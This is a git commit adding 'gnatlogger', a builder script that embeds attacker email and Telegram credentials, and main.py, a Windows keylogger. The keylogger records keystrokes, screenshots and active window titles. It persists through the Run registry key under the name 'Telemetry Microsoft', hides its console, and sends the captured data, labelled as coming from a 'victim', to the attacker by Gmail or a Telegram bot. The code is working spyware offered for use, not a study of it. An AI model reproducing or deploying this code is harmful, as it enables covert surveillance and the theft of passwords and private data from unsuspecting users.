da87aabfd3625ea2019ae0d895ec317b2cab3ee2
franklintimoteo <franklintimoteo@live.com>
2021-11-01 22:26:17 -0300

    Version 1 Test

---
+++ gnatlogger.py
@@ -0,0 +1,141 @@
+#!/usr/bin/python3
+
+banner = """
+
+ ██████╗ ███╗   ██╗ █████╗ ████████╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
+ ██╔════╝ ████╗  ██║██╔══██╗╚══██╔══╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
+ ██║  ███╗██╔██╗ ██║███████║   ██║   ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
+ ██║   ██║██║╚██╗██║██╔══██║   ██║   ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
+ ╚██████╔╝██║ ╚████║██║  ██║   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
+  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                                                                         
+"""
+
+import re
+import argparse
+import logging
+import os
+import sys
+from time import sleep
+
+logger = logging.getLogger(__name__)
+
+parser = argparse.ArgumentParser(description='Set configs to gerenerate a new file')
+parser.add_argument('-e', '--email', help='set a new email')
+parser.add_argument('-p', '--password', help='set a new password')
+parser.add_argument('-i', '--interval', type=int, default=60, help='set a new interval')
+parser.add_argument('-t', '--to', help='set send to email')
+parser.add_argument('-d', '--debug', default='ERROR', help='Enable debug loggs, use DEBUG')
+parser.add_argument('-u', '--uid', help='uid telegram @myidbot')
+parser.add_argument('-k', '--token', help='token bot telegram')
+parser.add_argument('--enabletelegram', action='store_true', help='enable telegram as send form')
+parser.add_argument('--enableemail', action='store_true', help='enable email as send form')
+parser.add_argument('--force', default=False, action='store_true',help='disable interactive and force generate file')
+
+
+def _re_replace(pattern, data, newstring):
+    prog = re.compile(pattern)
+    newdata = prog.sub(newstring, data, count=1)
+    return newdata
+
+def _change_defaults_file(email, password, to, uid, token, interval=60, enabletelegram=True, enableemail=True):
+    """Search and replace vars values: 
+        EDITWITHYOURGMAIL
+        EDITWITHYOURGMAILPASSWORD
+        INTERVALINSECONDS
+        WHATDOYOUEAMILYOUWANTTOSEND
+        USER_ID_TELEGRAM
+        TOKEN
+        ENABLE_TELEGRAM
+        ENABLE_EMAIL
+    """
+    _filename = 'main.py'
+    _filedist = 'telemetry.py'
+    logger.debug('\nFile default: %s\nFile output: %s' %(_filename, _filedist))
+    try:
+        # @todo: melhorar regex selecionando apenas o valor após o =
+        with open(_filename, 'r') as default_file:
+            data = default_file.read()
+            data = _re_replace(r"yourgmail=.+\n", data, "yourgmail='%s'\n" %email)
+            data = _re_replace(r"yourgmailpass=.+\n", data, "yourgmailpass='%s'\n" %password)
+            data = _re_replace(r"sendto=.+\n", data, "sendto='%s'\n" %to)
+            data = _re_replace(r"interval=.+\n", data, "interval=%s\n" %interval)
+            data = _re_replace(r"USER_ID_TELEGRAM=.+\n", data, "USER_ID_TELEGRAM=%s\n" %uid)
+            data = _re_replace(r"TOKEN=.+\n", data, "TOKEN_BOT='%s'\n" %token)
+            data = _re_replace(r"ENABLE_TELEGRAM=.+\n", data, "ENABLE_TELEGRAM=%s\n"%enabletelegram)
+            data = _re_replace(r"ENABLE_EMAIL=.+\n", data, "ENABLE_EMAIL=%s\n"%enableemail)
+            with open(_filedist, 'w') as distfile:
+                distfile.write(data)
+
+    except FileNotFoundError:
+        print('File %s not found' %_filename)
+    finally:
+        print('File %s edited with success!' %_filedist)
+
+def get_new_configs(params):
+    logger.debug('Setting news configs with params: %s' %params)
+    _shadow_params = params.copy()
+    print('Enter to default or type new config.') 
+    for key, value in _shadow_params.items():
+        new_value = input('%s [ %s ] > '%(key.title(), value)) or value
+        _shadow_params[key] = new_value
+    return _shadow_params
+
+def menu(args):
+    logger.debug('Option menu selected')
+    options_selected = args
+    params = {
+        'email': args.email,
+        'password': args.password,
+        'to': args.to,
+        'uid': args.uid,
+        'token': args.token,
+        'interval': args.interval,
+        'enabletelegram': args.enabletelegram,
+        'enableemail': args.enableemail
+    } 
+    
+    try:
+        while True:
+            os.system('clear')
+            sys.stdout.write(banner)
+            print('Params loaded: ')
+            for key,value in params.items():
+                print('- %s : %s' %(key,value))
+            print('[S] Set new configs  [K] Generate file with new configs [C] Compile to exe [Q] Quit')
+            user_choice = input("Gnat-> ")
+            if user_choice.upper() == 'S':
+                sys.stdout.write('Setting new configs: ')
+                new_params = get_new_configs(params)
+                params.update(new_params)
+
+            elif user_choice.upper() == 'K':
+                _change_defaults_file(**params)
+                sleep(3) # @question: clean exec and we not see result from change_defaults
+            elif user_choice.upper() == 'C':
+                ... # @todo: compile with pyinstaller and generate file exe
+                # @todo: options: qemu | winehq | virsh
+            elif user_choice.upper() == 'Q':
+                raise KeyboardInterrupt
+            else:
+                sys.stdout.write('Select an option or press CTRL+C or Q to quit')
+
+             
+    except KeyboardInterrupt:
+        os.system('clear')
+        exit()
+
+if __name__ == '__main__':
+    args = parser.parse_args()
+    email, password, interval, to = args.email, args.password, args.interval, args.to
+    uid, token, enabletelegram, enableemail = args.uid, args.token, args.enabletelegram, args.enabletelegram
+    fmt = "[%(levelname)s] %(funcName)s %(message)s"
+    logging.basicConfig(format=fmt, encoding='utf-8', level=args.debug)
+    logger.debug('Using args: %s' %args)
+    logger.debug('Force generate file: %s' %args.force)
+
+    if all([email, password, interval, to, uid, token, enabletelegram, enableemail]) or args.force:
+        _change_defaults_file(email, password, to, uid, token, interval, enabletelegram, enableemail)
+    else:
+        menu(args)
+
---
+++ main.py
@@ -0,0 +1,138 @@
+#########Settings#######jj#
+
+import sys
+import keyboard
+import win32api,pythoncom
+import win32console
+import win32gui
+import telebot
+import os,time,random,smtplib,string,base64
+from winreg import *
+from email.message import EmailMessage
+# Create the container email message.
+msg = EmailMessage()
+
+global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
+
+t=""
+pics_names=[]
+
+#########Settings########
+
+yourgmail="EDITWITHYOURGMAIL"
+yourgmailpass="EDITWITHYOURGMAILPASSWORD"
+sendto="WHATDOYOUEAMILYOUWANTTOSEND"
+interval=INTERVALINSECONDS
+USER_ID_TELEGRAM=EDITWITHYOURUSERID
+TOKEN_BOT="EDITWITHYOURTOKENBOT"
+ENABLE_TELEGRAM=WISHENABLETELEGRAM
+ENABLE_EMAIL=WISHENABLEEMAIL
+
+########################
+
+recently_active_windows = set()
+bot = telebot.AsyncTeleBot(TOKEN_BOT)
+
+try:
+    f = open('Logfile.txt', 'a')
+    f.close()
+except:
+    f = open('Logfile.txt', 'w')
+    f.close()
+
+def addStartup():  # this will add the file to the startup registry key
+    fp = os.path.dirname(os.path.realpath(__file__))
+    file_name = sys.argv[0].split('\\')[-1]
+    new_file_path = fp + '\\' + file_name
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2change, 'Telemetry Microsoft', 0, REG_SZ,
+               new_file_path)
+
+def Hide():
+    import win32console
+    import win32gui
+    win = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(win, 0)
+
+
+def ScreenShot():
+    global pics_names
+    import pyautogui
+    def generate_name():
+        return ''.join(random.choice(string.ascii_uppercase
+                       + string.digits) for _ in range(7))
+    name = str(generate_name())
+    pics_names.append(name+'.png')
+    pyautogui.screenshot().save(name + '.png')
+    
+def Get_recently_active_windows():
+    recently_windows = b''
+    for w in recently_active_windows:
+        recently_windows += b' \n' + w.encode('utf-8')
+    recently_windows = b'\n\nRecently active windows: ' + recently_windows
+    return recently_windows
+
+def Mail_it(data, pics_names):
+    recently_windows = Get_recently_active_windows()
+    data = data.encode('utf-8') + recently_windows
+    data = b'New data from victim\n' + data
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    server.starttls()
+    server.login(yourgmail, yourgmailpass)
+    server.sendmail(yourgmail, sendto, data)
+    server.close()
+                        
+    for pic in pics_names:
+        with open(pic, 'rb') as fp:
+            img_data = fp.read()
+        msg.add_attachment(img_data, maintype='image', subtype='png')
+        server = smtplib.SMTP('smtp.gmail.com:587')
+        server.starttls()
+        server.login(yourgmail, yourgmailpass)
+        server.sendmail(yourgmail, sendto, data)
+        server.sendmail(yourgmail, sendto, img_data)
+        server.close()
+
+def Telegram_it(data, pics_names):
+    recently_windows = Get_recently_active_windows()
+    data = data.encode('utf-8') + recently_windows
+    data = b'New data from victim\n' + data
+    bot.send_message(USER_ID_TELEGRAM, data)
+    
+    for pic in pics_names:
+        with open(pic, 'rb') as fp:
+            img_data = fp.read()
+        bot.send_photo(USER_ID_TELEGRAM, img_data)
+    
+def OnKeyboardEvent(event):
+    global yourgmail, yourgmailpass, sendto, interval, recently_active_windows
+
+    active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    recently_active_windows.add(active_window)
+    
+    data = event.name
+    global t, start_time
+    t = t + data
+
+    if len(t) > 500:
+        ScreenShot()
+        f = open('Logfile.txt', 'a')
+        f.write(t)
+        f.close()
+        t = ''
+
+    if int(time.time() - start_time) >= int(interval):
+        ScreenShot()
+        if ENABLE_EMAIL:
+            Mail_it(t, pics_names)
+        if ENABLE_TELEGRAM:
+            Telegram_it(t, pics_names)
+        t = ''
+
+
+addStartup()
+Hide()
+keyboard.hook(OnKeyboardEvent, suppress=True)
+start_time = time.time()
+pythoncom.PumpMessages()
